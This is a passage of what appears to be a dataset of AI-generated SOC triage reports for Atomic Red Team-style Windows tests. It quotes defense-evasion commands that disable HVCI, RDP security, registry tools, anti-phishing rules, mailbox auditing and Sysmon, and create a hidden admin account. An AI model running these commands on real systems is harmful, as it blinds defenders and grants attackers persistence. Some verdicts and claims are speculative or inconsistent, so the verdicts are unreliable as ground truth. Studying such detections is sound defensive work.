- Frequent execution of utilities like `wevtutil.exe` and `whoami.exe` in proximity to running PowerShell commands further heightens the suspicion as these are often used for log manipulation and user context verification in unauthorized activities.

Although these activities point towards suspicious behavior, conclusive evidence of a malicious payload or data exfiltration isn't directly seen in these logs. They warrant further investigation to rule out malicious scripts running and check for possible unauthorized access or lateral movement tactics being established.

### Resolution: SUSPICIOUS

#### Guidance
1. **Immediate Action**: Examine the origin of these PowerShell scripts to determine who initiated them and whether they align with expected administrative tasks.
2. **Environment Review**: Review recent changes in scheduled tasks, Start-up programs, and installed software for additional anomalous behavior.
3. **Endpoint Monitoring**: Increase monitoring on `Server002`, especially regarding PowerShell executions and process interactions.
4. **AV & EDR Check**: Conduct a full antivirus and EDR scan of `Server002` to detect any known threats potentially missed.
5. **Account Audit**: Verify any anomalous activity related to the `admin_test` account and ensure its credentials have not been compromised.

By following these suggested actions, you can thoroughly assess the security posture related to these events and fortify against any undetected threats."
Office 365 - Set Audit Bypass For a Mailbox,"Analyzing the provided logs, I noticed some behaviors that warrant further investigation:

1. **PowerShell Activity (Potentially Malicious)**:
   - The PowerShell command executed is suspicious. It creates a secure password and PSCredential object for an Office 365 user and connects to Exchange Online, then executes `Set-MailboxAuditBypassAssociation` with AuditBypass enabled, which is often used to hide mailbox audit logs. This action could potentially be used to hide unauthorized access to email accounts, indicative of malicious activity.
   - The command running with elevated privileges (`IntegrityLevel: High`) by `SERVER002\\admin_test` raises concerns. This account and its activities should be reviewed to ensure it is legitimate, given that administrative rights are exploited frequently in attacks.

2. **Frequent Wevtutil and Conhost Executions**:
   - There is frequent usage of `wevtutil.exe` and `conhost.exe`. While `wevtutil` is a legitimate tool for managing Windows event logs, it's also known to have been used by attackers to clear event logs, which could be indicative of an attempt to cover tracks.
   - The high activity within a short time frame might be normal in some automated tasks, but given other suspicious activities, these should be scrutinized for legitimacy.

3. **High Integrity Level Processes**:
   - Processes executing with high integrity levels, such as PowerShell, could imply elevated permissions. It’s crucial to validate whether these processes are necessary and legitimate.
   
4. **Abnormal NT AUTHORITY\SYSTEM Execution**:
   - The use of NT AUTHORITY\SYSTEM privileges by PowerShell also indicates a need to ensure that these activities are authorized.
   - Powershell commands executed with `-ExecutionPolicy Restricted` do not inherently mitigate the risks posed by potentially harmful commands being executed.

5. **Missing Security Logs**:
   - The absence of security event logs makes it difficult to verify any related login, admin privileges escalation, or user modification activities. This absence itself can be indicative of log tampering.

**Assessment & Resolution**:
The logs show potentially malicious usage of PowerShell coupled with high privileges to connect to Exchange Online and modify audit settings, which are serious signs of potential compromise. Given these observations:

- **Resolution: MALICIOUS**

**Guidance on How to Proceed**:
- Immediate investigation into the extent of any unauthorized access, especially focusing on email accounts tied to the actions observed.
- Review, re-evaluate, and tighten permissions for `admin_test` to ensure the account isn't misused.
- Review Windows Event Log retention and potential tampering, ensuring all logs are adequately retained and monitored.
- Conduct a full security audit of the server, paying close attention to user activities and known vulnerabilities.
- Regularly educate users about security best practices, especially concerning highly privileged accounts."
Enabling Remote Desktop Protocol via Remote Registry,"**Analysis of the Provided Windows Event Logs:**

1. **Sysmon Events:**
   - The repeated execution of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` by the user `SERVER002\admin_test` is notable. `wevtutil.exe` is used to manage event logs and subscriptions, and frequent use in quick succession might suggest a script or automated task is interacting with event logs, which could be benign or malicious depending on context.
   - The execution of `C:\Windows\System32\cmd.exe` with a command line to alter the registry related to Terminal Server RDP settings is suspicious. The command modifies the Security Layer setting for RDP, which can be used to weaken security or enable unauthorized remote access.
   - `C:\Windows\System32\whoami.exe` is run, which could be part of a script to gather user context information. While `whoami.exe` itself is benign, its usage in conjunction with other activities can be telling.
   - The `C:\Windows\System32\reg.exe` tool is used to directly edit the registry to change RDP settings, further supporting suspicious modification activity targeting remote access configurations.
   - The process execution by `NT AUTHORITY\SYSTEM`, such as `WmiPrvSE.exe`, `TiWorker.exe`, and `TrustedInstaller.exe`, are common Windows maintenance tasks and appear normal.

2. **Command Analysis:**
   - **Registry Modification Command:**
     ```
     reg add ""hklm\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp"" /v SecurityLayer /t REG_DWORD /d 0 /f
     ```
     This command sets the RDP Security Layer to 0, downgrading the encryption and potentially making the machine vulnerable to certain types of attacks or unauthorized access.

3. **General Assessment:**
   - The combination of event log clearing activities, modifications to RDP security settings, and the use of processes like `cmd.exe` for registry modifications suggest behaviors consistent with an attacker clearing traces or adjusting system settings for further exploit.
   - The activities performed under the `SERVER002\admin_test` account indicate privileged access. Whether this is due to legitimate administrative tasks or potentially malicious activity needs to be further corroborated by checking if these actions match known user maintenance activities or if there was any unauthorized access to this admin account.

4. **Resolution: SUSPICIOUS**

   Based on the suspicious behavior detected:
   - Unusual usage pattern of `wevtutil.exe` and `conhost.exe`.
   - Suspicious command execution modifying RDP settings to potentially reduce security.
   - Contextual signs point towards potential compromise or post-compromise clean-up.

**Recommendations:**
- **Immediate Action:**
  - Investigate `SERVER002\admin_test` account usage to verify legitimate access and scrub for any signs of compromise.
  - Review the change history and pattern of remote login attempts related to RDP to ascertain any unauthorized access.
  - Conduct a threat hunt on the network focusing on lateral movement and persistence mechanisms possibly employed by an attacker.
  
- **Long-term Mitigation:**
  - Enforce stricter access controls and monitoring on privileged accounts.
  - Regularly audit critical security settings and ensure unexpected changes trigger alerts.
  - Increase security layers on remote access solutions and enforce multi-factor authentication if not already in place.  

This is a potential compromise, and thus, further investigation and remediation actions are strongly recommended to protect organizational assets."
Create Windows System File with Attrib,"In analyzing the provided event logs, I've identified several activities that warrant further examination:

### Suspicious Activities and Observations
1. **Repeated Execution of Command-line Commands:**
   - There are multiple instances of `cmd.exe` executing commands related to the existence and manipulation of a file in the Temp directory (e.g., checking for the presence of `data.001.txt` and using `attrib.exe` to set attributes). While this is not inherently malicious, frequent and automated command executions, particularly targeting a temporary directory, could suggest attempts at persistence or hiding malicious activity.

2. **Use of Windows Event Utility (`wevtutil.exe`):**
   - There are multiple instances of `wevtutil.exe` executions, which might indicate an attempt to manipulate or clear event logs to cover tracks, though no specific command is detailed here.

3. **Processes with Elevated Privileges:**
   - Multiple processes are observed being executed under the `NT AUTHORITY\SYSTEM` account, including Microsoft Edge update processes. The integrity level is set to High, and processes are using the SYSTEM integrity level, which could potentially be exploited for privilege escalation or persistence mechanisms.

4. **Batch of MicrosoftEdgeUpdate Events:**
   - There is a significant volume of activity related to the Microsoft Edge Update process. While most of it appears consistent with updates, the presence of Edge update executables in unusual directories (e.g., `C:\Program Files (x86)\Microsoft\Temp`) and repeated calls might suggest anomalous behavior or misuse of the update process by malware for execution under trusted executable facade.

5. **Process Relationships and Parent/Child Execution:**
   - Some parent-child relationships suggest potentially automated workflows or scripts, particularly the consistent spawning of console and other utility processes (e.g., `conhost.exe`, `sppsvc.exe`). While these processes are typically benign, their context in this log requires further scrutiny especially when they appear in quick succession.

### Assessment and Recommendations
- **Suspicious Activity Detected:** The volume and pattern of command-line executions, along with elevated privilege process executions, are enough to warrant concern. While each individual log entry might be consistent with legitimate system activities, the patterns observed collectively can be indicative of malicious scripting or malware activity that aims to blend in with legitimate system processes.

- **Resolution: SUSPICIOUS**
   - **Further Investigation Needed:** This assessment concludes that the log entries exhibit suspicious patterns that need more in-depth investigation. It's recommended to:
     - Conduct a detailed analysis of the scripts or tasks spawning these processes.
     - Verify the legitimacy of all scripts and scheduled tasks related to the observed activities.
     - Check the file systems and directories mentioned for any unexpected changes or malicious files.
     - Review and verify the intent of the changes made by `attrib.exe`.
     - Monitor for any further anomalies in logs for persistence or lateral movement.

Subsequent analysis should focus on correlating these logs with other security alerts and endpoint data to determine if there is indeed an active or past infection rooted in these patterns."
Invoke CHM with InfoTech Storage Protocol Handler,"After analyzing the provided logs from different event channels (Windows PowerShell, Sysmon, Security, System), I have observed the following points:

### Analysis:

1. **PowerShell Logs**:
   - The events indicate the execution of a potentially suspicious PowerShell command: `{Invoke-ATHCompiledHelp -InfoTechStorageHandler its -HHFilePath $env:windir\hh.exe -CHMFilePath Test.chm}`.
   - The use of Invoke-ATHCompiledHelp and manipulation of CHM files could suggest an attempt to exploit compiled HTML help files (.chm), which is a known method to deliver malicious payloads.

2. **Sysmon Logs**:
   - Numerous instances of PowerShell execution (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) by the `admin_test` user stand out. The processes like `whoami.exe`, `hostname.exe`, and frequent usage of `conhost.exe` in conjunction with PowerShell suggest command execution activities.
   - Processes such as `wevtutil.exe` are executed, which could potentially be used to clear or manipulate event logs, a common tactic used to cover tracks during malicious activity.
   
3. **Security Logs**:
   - Evidence of a logon event (EventID 4624) by SYSTEM user without a clear accompanying user interaction, and a high integrity level process (""elevated token"") could imply automated or scripted tasks with high privileges.
   - Privilege escalation (EventID 4672) shows a range of privileges being assigned to the SYSTEM account, a common tactic in maintaining persistence or gaining broader access.

4. **System Logs**:
   - Multiple Windows Update activities and component-related updates appear normal for system maintenance. No immediate suspicious behavior is noted in these logs.

### Conclusion:

- There is clear evidence of PowerShell being utilized to run a suspicious script that involves CHM files, potentially a tactic in delivering or executing malicious payloads.
- The combination of process execution logs, security logs indicating elevated privileges, and the execution of utility programs like `wevtutil.exe` for potential log manipulation, collectively suggest potential signs of compromise.

### Resolution:
- **MALICIOUS**: The detected PowerShell activity, with the executed command being atypical and coupled with administrative actions and potential log evasion tactics, leads to a definitive conclusion of malicious activity.

### Guidance:
- Immediately isolate the affected system (Server002) to prevent further spread or damage.
- Conduct a thorough forensic investigation to determine the full scope of the compromise and identify affected systems and data.
- Review and secure any credentials that may have been used or compromised during this event, especially those with administrative privileges.
- Implement PowerShell script block logging and increased monitoring on critical systems to detect similar activities.
- Consider engaging with cybersecurity response services if the in-house capability is limited in addressing this potential breach."
office-365-Disable-AntiPhishRule,"Upon reviewing the provided Windows event logs, the following analysis identifies suspicious activities that might indicate malicious behavior:

### Suspicious and Anomalous Behaviors:
1. **PowerShell Activity:**
   - Logs show PowerShell script execution that connects to Exchange Online using constructed credentials, retrieves, and disables Anti-Phishing rules:
     ``` 
     powershell.exe & {$secure_pwd = """" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList """", $secure_pwd; Connect-ExchangeOnline -Credential $creds; $test = Get-AntiPhishRule; Disable-AntiPhishRule -Identity $test.Name -Confirm:$false; Get-AntiPhishRule}
     ```
   - The script connects to a potentially sensitive environment (Exchange Online) and intentionally disables security features (Anti-Phishing rules), which is highly suspicious and typically indicative of malicious activity.

2. **System Tool Utilization:**
   - Use of `wevtutil.exe` in close time proximity to PowerShell executions. This tool manages event logs, which can be used to conceal evidence of other activities, suggesting potential log tampering or cleanup.
   - Execution of commonly used utilities (`conhost.exe`, `whoami.exe`, `hostname.exe`) might be legitimate, but given the context, they can be indicators of reconnaissance or scripting activities.

3. **High Integrity and System Level Processes:**
   - Execution of scripts and commands with high integrity and SYSTEM level permissions.
   - Processes such as `SecureBootEncodeUEFI.exe` and other legitimate system binaries running frequently around the same timeframe further suggest the possibility of privilege escalation or persistence mechanisms.

### Threats and Risks Identified:
- **Disablement of Security Applications:** The disabling of Anti-Phishing rules is a direct compromise of the organization's security posture, leaving email systems vulnerable.
- **Potential Credential Theft or Abuse:** The usage of potentially invalid credentials (empty strings) to connect and manage critical services might indicate a credential theft attempt or use of hardcoded credentials.
- **Evidence Manipulation:** Usage of event log manipulation tools might be an attempt to hide malicious activities or to create a false sense of security.

### Assessment:
Given the nature of the commands executed in the PowerShell logs and corroborating suspicious system activities, the probability of these being benign is very low. The activities seem targeted and sophisticated, aimed at compromising organizational defenses and possibly gathering further access or creating persistence.

### Guidance:
- **Immediate Investigation:** Conduct a full investigation of the machine, focusing on:
  - Authentication logs and access patterns to determine any unauthorized access or credential misuse.
  - Network traffic analysis to identify potential data exfiltration or further malicious communications.
- **Containment and Remediation:**
  - Isolate the affected system to prevent further spread.
  - Restore Anti-Phishing rules and audit other security configurations for compromise.
  - Evaluate Active Directory logs to ensure no widespread privilege escalation or deployment of malicious agents.

The resolution for these findings is:

**MALICIOUS** - There is strong evidence of malicious activity in the logs that need immediate attention and remediation."
Disable Hypervisor-Enforced Code Integrity (HVCI),"Upon reviewing the provided Sysmon logs, there are several aspects that require attention:

1. **Command Execution via PowerShell**: There's a PowerShell command executed that modifies a registry key:
   - Command: `powershell.exe & {reg add ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"" /v ""Enabled"" /t REG_DWORD /d 0 /f}`
   - This command disables Hypervisor Enforced Code Integrity by setting the ""Enabled"" value to 0. This behavior is usually associated with attempts to bypass security mechanisms, which can indicate a potential compromise or malicious activity.

2. **Registry Modifications**: Multiple Sysmon logs show the execution of commands querying the state of DeviceGuard using `cmd` and `reg.exe`.
   - Such queries alone aren't inherently malicious but, given the subsequent disabling of security features, they could be part of a reconnaissance or preparation step for a malicious campaign.

3. **High Integrity Level Execution**: The logs show the activities, including PowerShell and registry modifications, being executed with high integrity levels suggesting administrative privileges were utilized.
   - Execution with elevated privileges is often necessary for system changes and can indicate a potential privilege escalation if the user wasn’t expected to have administrative rights.

4. **Parent Process**: The parent process for the suspicious PowerShell command is `wsmprovhost.exe`. The usage of `wsmprovhost.exe` (Windows Remote Management Host) as a parent process might suggest remote connectivity or command execution via Windows Remote Management (WinRM).

**Assessment:**
- The logs indicate a series of actions geared towards potentially modifying security features on the system. The disabling of Hypervisor Enforced Code Integrity, in particular, is a clear indicator of potentially malicious intent.
  
- While the presence of `wsmprovhost.exe` as a parent process isn't inherently suspicious, combined with the registry modification activities, it raises a concern regarding unauthorized remote actions or administrative misuse.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
1. **Immediate Isolation**: The machine should be immediately isolated from the network to prevent any further potential malicious activities.
2. **Thorough Investigation**: Conduct a full security assessment on the machine:
   - Check for additional indicators of compromise.
   - Review user access logs to validate the legitimacy of the administrative actions.
   - Assess network logs for any suspicious remote connections.
3. **Review and Restore Impacted Security Settings**: Ensure all security features, such as Device Guard, are correctly configured and active.
4. **Threat Hunt**: Investigate other systems in the network for similar indicators to rule out lateral movement.
5. **Post-Incident Monitoring**: Enhance monitoring on key systems to detect similar activities promptly in the future.
6. **Review and Update Security Policies and Practices**: Ensure all systems follow stringent security configurations and review user access controls, especially for privileged accounts."
Create Hidden User in Registry,"Upon analyzing the provided Windows event logs, several activities are of concern and merit further investigation. The logs indicate a series of actions that resemble typical behavior associated with malicious intent.

### Analysis:

1. **Suspicious Command Execution:**
   - The logs show the execution of `cmd.exe` with a command that creates a new user account (`fileOperator$`) with administrative privileges (`NET USER fileOperator$ At0micRedTeam! /ADD /expires:never`). This is particularly suspicious because it attempts to add a user without expiration and possibly elevate its privileges.
   - Execution of `REG ADD` command to modify the registry for hiding this user account from the login screen (`Winlogon\SpecialAccounts\Userlist`).

2. **User and Account Changes:**
   - Security log events `4720`, `4722`, `4724` indicate user account creation, enabling, and password reset for `fileOperator$`, all performed by `admin_test`. This aligns with the suspicious command logged above.
   - Event `4728` shows that `fileOperator$` was added to a security-enabled group, corroborating the attempt to provide it with elevated privileges.

3. **Process and Command-Line Observations:**
   - Execution of legitimate Windows binaries such as `wevtutil.exe`, `conhost.exe`, and `hostname.exe` may indicate process hollowing or use of living-off-the-land binaries (LOLBins) techniques, often used to bypass detection.
   - The sequence of processes spawning from `wsmprovhost.exe` through to `cmd.exe` and others suggest a pattern of potentially automated malicious behavior.

4. **Time Change Events:**
   - System log shows several kernel time change events around the same period. This could indicate an attempt to manipulate time, possibly to evade time-based logging mechanisms or audits.

### Assessment:

This collection of activities, especially the creation of an administrator-equivalent account using scriptable commands, registry modifications to hide the user account, and the context of actions by `admin_test`, strongly suggest a potential compromise.

### Resolution:

- **Resolution: MALICIOUS** - The behavior exhibited in the logs points towards unauthorized and potentially harmful activity. Immediate containment and remediation actions are recommended.

### Recommendations:

1. **Immediate Actions:**
   - Isolate the affected machine to prevent any lateral movement or further execution of potentially malicious commands.
   - Delete the suspicious user account `fileOperator$` and ensure there are no orphan processes or residual access permissions.

2. **Further Investigation:**
   - Conduct a full forensic analysis on the machine to identify the root of the compromise and any additional indicators of compromise (IOCs).
   - Review additional logs, such as network traffic, firewall, and antivirus logs, for more context on the activities during this period.

3. **Post-Incident Measures:**
   - Strengthen monitoring for similar patterns across other systems.
   - Re-evaluate user access permissions and implement stricter privilege management protocols.
   - Consider deploying anti-malware solutions explicitly tailored for detecting privilege escalation activities.

By acting promptly and comprehensively reviewing both current and historical data, the security team can better understand the breach and prevent future occurrences."
Disable Windows Registry Tool,"### Detailed Analysis of the Logs

Upon reviewing the provided Windows event logs, the following observations and analysis have been made to determine any indicators of potential malicious activity.

#### Observations:

1. **Time Synchronization Events:**
   - Security log events with EventID 4616 indicate time changes, which are commonly benign, especially when linked to system time synchronization tasks. These events do not inherently indicate malicious activity.

2. **Service Stopped Event:**
   - In the Application log, an event with the edgeupdate service being stopped is recorded. This is not unusual and can occur as part of regular system operations or updates.

3. **Command Execution (Sysmon Log):**
   - Notably, in the Sysmon log, there is an instance of `cmd.exe` being executed with the command line to modify the registry: 
     ```bash
     reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f
     ```
   - This command intends to disable registry editing tools, which can be suspicious as it might be used by a malicious actor to prevent users from inspecting or modifying potentially harmful registry settings.

4. **Use of Wevtutil:**
   - Multiple events show operations involving `wevtutil.exe`, a legitimate utility used for managing event logs. 
   - Operations include exporting event logs which could be legitimate if conducted by an admin but could be concerning if unauthorized, possibly indicating an attempt to obfuscate or backdoor investigation efforts.

5. **EdgeUpdate Processes:**
   - Various instances of process creation related to `MicrosoftEdgeUpdate.exe` are noted. They appear to be part of the normal update cycle for Microsoft Edge. The presence of Edge Update-related service activity is generally benign.

6. **Running Processes Executed by the admin_test User:**
   - The `SERVER002\admin_test` account appears to be executing administrative tasks and several services.
   - The execution of `whoami.exe` and `hostname.exe`, while often benign, could imply someone verifying identity and system details, especially when run from a command line.

#### Assessment:

- **Suspicious Activity Detected:** The command executed via `cmd.exe` to modify the registry is notably suspicious. Disabling registry tools can be indicative of malicious behavior aimed at preventing further investigation or system changes.
- **Wevtutil Executions:** The use of `wevtutil` to export event logs is suspicious when coupled with the registry modification. It raises concerns about an attempt to manipulate or hide logs.
- **Normal System Update Behavior:** The Microsoft Edge Update events are consistent with standard behavior and are not indicative of malicious activity.

### Threats or Risks Identified:

- The modification of the registry to disable registry tools can significantly hinder security analysis and mitigation measures.
- The use of `wevtutil` for exporting event logs without additional context could indicate an attempt to cover tracks.

### Guidance on How to Proceed:

1. **Immediate Action:** Investigate the context in which these registry modifications and `wevtutil` commands were run. Verify if the actions were authorized or part of a known script or administrative task.
2. **User Action Review:** Examine user logs and credentials for the account `SERVER002\admin_test` to ensure the account has not been compromised.
3. **Monitoring and Response:** Increase monitoring on this host and consider isolating it from critical parts of the network until all anomalous activities are accounted for.
4. **Log Continuity:** Ensure logging and auditing are active for critical changes and that logs are being securely stored and reviewed.

### Resolution:

Given the suspicious activity, notably the registry modifications and context-limited `wevtutil` usage:

**Resolution: SUSPICIOUS**

Further investigation is recommended to determine the legitimacy of these actions and to ensure no compromise has occurred."
System File Copied to Unusual Location,"### Analysis of Logs

**Suspicious Activity Identified:**

Upon reviewing the provided logs, multiple instances of potentially malicious behavior are observed, particularly surrounding the execution of PowerShell scripts and processes indicative of potentially harmful intent. Here are the elements of concern:

1. **Unusual PowerShell Activity:**
   - The logs indicate the execution of a PowerShell command where `cmd.exe` is copied to a new location and executed. The command line seen in several logs:
     ```plaintext
     powershell.exe & {copy-item \""$env:windir\\System32\\cmd.exe\"" -destination \""$env:allusersprofile\\cmd.exe\""; start-process \""$env:allusersprofile\\cmd.exe\""; sleep -s 5; stop-process -name \""cmd\"" | out-null}
     ```
   - Copying cmd.exe to a new location and executing it can be an indicator of malicious activity. This behavior resembles techniques used in process hiding or execution from non-standard paths, which could be an attempt to evade security monitoring.

2. **Process Execution in Sysmon Logs:**
   - Multiple instances of `conhost.exe` being spawned under various iterations of command processes (`cmd.exe`) following the initiation from PowerShell.
   - There is a PowerShell execution that starts cmd.exe at a high integrity level, which is suspicious when initiated from a path that is typically clean, especially since it was executed not from a user invoking a direct need for legitimate use.

3. **Security Audit Entries:**
   - Event ID 5379 (Credential Validation):
     - Multiple events indicate failed credential validation attempts (`ReturnCode: 3221226021`), which can suggest brute-force or unauthenticated access attempts on the system.
     - These repeated failures can be indicative of malicious attempts to gain access, particularly when seen in conjunction with other suspicious behavior.

**Malicious Behavior Assessment:**

- The combination of the above abnormal activities, especially the PowerShell command execution that involves `cmd.exe`, and failed security credential validations suggest potential compromise.
- The identified PowerShell script aimed at moving and executing critical system binaries is typically leveraged in lateral movement, persistence, or privilege escalation attempts.
- The consistent pattern of accessing and executing system utilities could signify an ongoing attack exploiting legitimate tools for illegitimate purposes, aligning with tactics observed in various threat actor methodologies.

**Conclusion:**
Based on the analysis, the logs reveal activities typically associated with potential malicious operations. The PowerShell usage combined with unauthorized credential access attempts is prolific in cyber attack strategies.

**Resolution: MALICIOUS** 

### Guidance and Next Steps:

1. **Immediate Isolation:**
   - Isolate the affected host (Server002) from the network to prevent further propagation of the potential threat.

2. **Forensic Analysis:**
   - Conduct a deeper forensic analysis to understand the scope and impact of the incident on the sever and other interconnected systems.

3. **Review and Block Indicators:**
   - Review and block any indicators of compromise (IOCs) identified, particularly relating to the command and control communications and specific file hash signatures.

4. **Security Hardening:**
   - Strengthen PowerShell logging and employ advanced threat detection solutions to monitor for unusual activities.
   - Implement privileged access workstations for administrators to reduce attack vectors on critical systems.

5. **Update and Patch:**
   - Ensure all systems, including security software, are up-to-date with the latest patches to mitigate vulnerabilities.

6. **User Awareness:**
   - Conduct a security awareness campaign focusing on the detection of social engineering and phishing tactics, which often precede such compromises.

By implementing these steps, you can mitigate the current threat and improve your future security posture."
attrib - hide file,"Upon reviewing the provided logs, several entries seem to warrant closer examination to determine their nature and potential implications.

### Analysis Summary:

1. **Whoami.exe Execution (Sysmon Log)**
   - **Sysmon Event 1** indicates multiple executions of `whoami.exe`, a legitimate tool that displays logged-on user information, executed by the `SERVER002\admin_test` user with high integrity level. While `whoami.exe` execution itself is not inherently malicious, repeated calls may suggest enumeration activities. Particularly, if an attacker is determining user permissions or verifying compromised accounts.

2. **Wevtutil.exe Execution**
   - There are several logs showing execution of `C:\Windows\System32\wevtutil.exe` by `SERVER002\admin_test`. The `wevtutil.exe` utility interacts with Windows Event logs; therefore, its repeated execution could suggest log file manipulation, which may be used to cover tracks after a compromise.

3. **Cmd.exe and Attrib.exe Commands**
   - **Cmd.exe (Process Id 6924):** The instance executing a sequence of commands to create a directory and modify file attributes (`attrib +h`), potentially hiding files. These actions can be seen as data obfuscation or attempts to hide files from normal scrutiny.
   - This could indicate activities consistent with malware installing itself discreetly or a script attempting to create undetectable files. Notably, this was executed in a temp directory which is often used by malware due to its permissions and expected non-persistent nature.

4. **EdgeUpdate Execution**
   - Regular execution of `MicrosoftEdgeUpdate.exe` processes seems routine for system updates. However, instances executed from `C:\Program Files (x86)\Microsoft\Temp\` are slightly abnormal as malicious executables could masquerade in temporary directories to avoid detection. This warrants further investigation to affirm legitimacy.

5. **Time Service Events (System Log)**
   - Time events (EventID 1 from Kernel-General) with slight adjustments in system time, though could be legitimate, might also indicate suspicious time manipulation known patterns if they suggest clock changes aiming to disrupt log integrity temporal correlation.

### Conclusion and Recommendation:

- **Resolution: SUSPICIOUS**

The log activities overall contain possibly benign individual entries, but specific behaviors could align with common compromise patterns:
   - High-integrity execution of `whoami.exe` could be hostile if aimed at user enumeration.
   - `wevtutil.exe` suspiciously used by a non-standard user may imply attempts to hide malicious activities.
   - Manipulation of file attributes (using `attrib.exe`) on potentially concealed files denotes typical stealth methods used by malware.

### Next Steps:
1. **Forensic Investigation**: Correlate these log entries with other artifacts (network activities, system changes) to support or refute these suspicions. Investigate the starting points of these commands and the existence of unusual scripts or scheduled tasks.
   
2. **Endpoint Analysis**: Conduct memory and disk forensics for anomalies or rogue processes on `SERVER002`. Cross-check file hashes from these applications against known threat databases.

3. **Monitoring and Alerts**: Implement real-time monitoring and alerting on sensitive activities such as admin logins and executions of `wevtutil.exe`, `cmd.exe` with suspicious commands.

4. **User Verification**: Verify if `SERVER002\admin_test` activities align with routine operations or if the account has been compromised.

Engage with the Incident Response team to perform these next steps and confirm or dismiss the malicious context."
Store file in Alternate Data Stream (ADS),"**Analysis of Logs:**

### Suspicious or Anomalous Behavior:
1. **Repeated Execution of `wevtutil.exe` and `conhost.exe`**:
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` being executed rapidly in succession. The presence of these processes in quick succession might suggest automated scripting or an attempt to harvest event logs.
  
2. **Execution of PowerShell with Embedded Commands**:
   - A PowerShell script was executed starting with `if (!(Test-Path C:\Users\Public\Libraries\yanki -PathType Container))...`. This command checks for the existence of a directory and creates it if it doesn’t exist, followed by launching a process to write to an alternate data stream (`desktop.ini:desktop.ini`). This type of activity is often associated with obfuscating files or data.
   - The command uses `Start-Process` to execute a command prompt, which then executes `type c:\windows\system32\cmd.exe` redirected into a hidden stream. Such activity is typically suspicious as it resembles a data exfiltration or persistence mechanism.

3. **Execution of Windows Tools: `hostname.exe` and `whoami.exe`**:
   - Both `hostname.exe` and `whoami.exe` were executed from a high integrity level. While their usage isn't inherently malicious, their combination with other suspicious activities might indicate reconnaissance activities.

4. **Time Change Events**:
   - There are logs showing changes in system time. Although the specific intention of these time changes may not immediately indicate malicious activity, they can be used in certain malware scenarios to evade detection or disrupt logging mechanisms.

5. **Multiple `MicrosoftEdgeUpdate.exe` Executions**:
   - While `MicrosoftEdgeUpdate.exe` is a legitimate process for updating Microsoft Edge, it is noted in multiple log entries with different parent process entries, suggesting multiple update processes or potentially mistimed or misused updates for persistence.

### Potential Malicious Activity:
- **The use of PowerShell with inline scripts**, especially those dealing with directory checks and data manipulation in alternate data streams, is particularly indicative of evasive malicious behavior.
- **Automated execution and process creation** patterns, particularly those that interact with system utilities (`wevtutil.exe`, `conhost.exe`).
- **Time skew manipulation** can thwart detection systems or hide activities by altering timestamps.

### Assessment:
Given the combination of these activities—particularly PowerShell command usage indicative of an Advanced Persistent Threat (APT) profile, frequent executions of system utilities in succession, time modification events, and the usage of alternate data streams—there is strong evidence to suggest potential malicious intent.

### Conclusion and Guidance:
- **Resolution: MALICIOUS**
  
Given the behaviors identified, particularly the PowerShell script execution, and unusual process activities, it is suggested this host has been compromised. It is recommended to:
1. **Isolate the affected system** immediately to prevent further potential action by attackers.
2. **Conduct a full forensic analysis** on the system to understand the scope and entry vector of the attack.
3. **Review network logs** and other systems for signs of lateral movement or similar activity.
4. **Update security policies** and initiate user training focused on the detection of PowerShell misuse and proper use of system utilities.
5. **Perform a malware scan** using an updated AV/AM tool to determine any dormant or hidden malicious content.
6. **Check for persistence mechanisms**, such as scheduled tasks or rogue startup items, potentially added by the attacker."
Lolbin Gpscript logon option,"After thoroughly reviewing the provided logs, here's the detailed analysis:

### Analysis Summary:
1. **Security Log**:
    - **Events 4616**: These relate to system time changes, managed by `svchost.exe` under the `LOCAL SERVICE` account. These appear routine, showing normal time adjustments and don't immediately suggest malicious activity.

2. **Sysmon Log**:
    - **Process Execution (Event ID 1)**:
        - Numerous processes running related to Windows and Edge updates, such as `wevtutil.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and `MicrosoftEdgeUpdate.exe`.
        - The command-line arguments and execution of these processes seem typical for system updates, particularly those concerning Microsoft Edge.
    - **Image Loading (Event ID 5)**:
        - Regular occurrence of image loads, mostly involving system processes and update-related executables.
        - The presence of `cmd.exe` with `/c Gpscript /logon` is slightly unusual if it frequently recurs without an apparent legitimate update or script execution context.

3. **System Log**:
    - Consistent with timezone and time synchronization activities via NTP from `time.windows.com`, showing usual operations expected in a Windows environment undergoing typical time adjustments.

4. **Application Log**:
    - Events associated with Microsoft Edge updates, showing regular service stops, possibly aligned with update completion.
    
### Suspicious or Anomalous Behavior:
- The heavy load of Microsoft Edge-related activities in a short timeframe, particularly with `EdgeUpdate` components executing from system directories and temporary folders, may warrant further attention. However, this could also be a legitimate update process.
- Other commands and tools like `whoami.exe` and `hostname.exe` can often be leveraged in reconnaissance phases of attacks if out of place. In this instance, they appear to be part of a succession of operations likely linked to system and update verification.

### Conclusion:
The logs present activities indicative of routine system updates and time synchronization operations. Given the context and absence of evident security breaches, privilege escalations, or irregular activities beyond what is detailed:

- **Resolution: BENIGN**: The logs contain benign activity mostly linked to system maintenance and updates. No compelling indicators of a compromise or malicious actions were observed from the log entries provided.

### Guidance on How to Proceed:
- Continue monitoring for any unusual spikes in similar activities, especially looking for repeated processes like `cmd.exe` with unusual commands.
- Ensure that EDR alerts are well-calibrated to identify deviations from normal update patterns which can be flagged for deeper analysis.
- Validate and ensure regular updates keep operating as expected, and system integrity checks return expected results."
Unload Sysmon Filter Driver,"### Analysis:

#### Suspicious or Anomalous Behavior:

1. **Presence of PowerShell and Command Execution:**
   - The **fltMC.exe** and **findstr.exe** activities with command-line arguments suggest the user was checking if the `SysmonDrv` filter driver is loaded. This is a common technique used in incident response or by adversaries to verify the presence of security tooling before disabling it.
   - The subsequent execution of **cmd.exe** with `fltmc.exe unload SysmonDrv` clearly indicates an attempt to unload the Sysmon driver, potentially trying to disable Sysmon logging on the system.

2. **Use of High Integrity Processes:**
   - The entries indicate a user with **high integrity**, SERVER002\\admin_test, performing these activities, which suggests the possibility of administrative access being used either legitimately or maliciously.

3. **Sysmon Driver Unloading Attempt:**
